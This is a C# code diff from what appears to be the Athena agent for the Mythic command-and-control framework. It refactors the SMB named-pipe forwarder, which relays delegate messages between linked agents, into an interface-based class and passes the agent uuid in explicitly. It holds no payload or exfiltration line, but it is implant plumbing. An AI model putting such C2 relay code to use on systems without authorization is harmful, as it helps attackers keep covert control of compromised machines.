@@ -1,4 +1,5 @@
-﻿using Athena.Models.Mythic.Response;
+﻿using Athena.Models.Config;
+using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using H.Pipes;
@@ -11,17 +12,18 @@ using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace Athena
+namespace Athena.Forwarders
 {
-    public class Forwarder
+    public class SMB : IForwarder
     {
         public bool connected { get; set; }
         public ConcurrentBag<DelegateMessage> messageOut { get; set; }
         private PipeClient<DelegateMessage> clientPipe { get; set; }
         private object _lock = new object();
         private ConcurrentDictionary<string, string> partialMessages = new ConcurrentDictionary<string, string>();
+        private string uuid { get; set; }
 
-        public Forwarder()
+        public SMB()
         {
             this.messageOut = new ConcurrentBag<DelegateMessage>();
         }
@@ -39,8 +41,9 @@ namespace Athena
         }
 
         //Link to the Athena SMB Agent
-        public async Task<bool> Link(MythicJob job)
+        public async Task<bool> Link(MythicJob job, string uuid)
         {
+            this.uuid = uuid;
             Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
 
             try
@@ -77,7 +80,7 @@ namespace Athena
                     {
                         msg = new DelegateMessage()
                         {
-                            uuid = MythicConfig.uuid,
+                            uuid = this.uuid,
                             message = part,
                             c2_profile = "smb",
                             final = true
@@ -87,7 +90,7 @@ namespace Athena
                     {
                         msg = new DelegateMessage()
                         {
-                            uuid = MythicConfig.uuid,
+                            uuid = this.uuid,
                             message = part,
                             c2_profile = "smb",
                             final = false
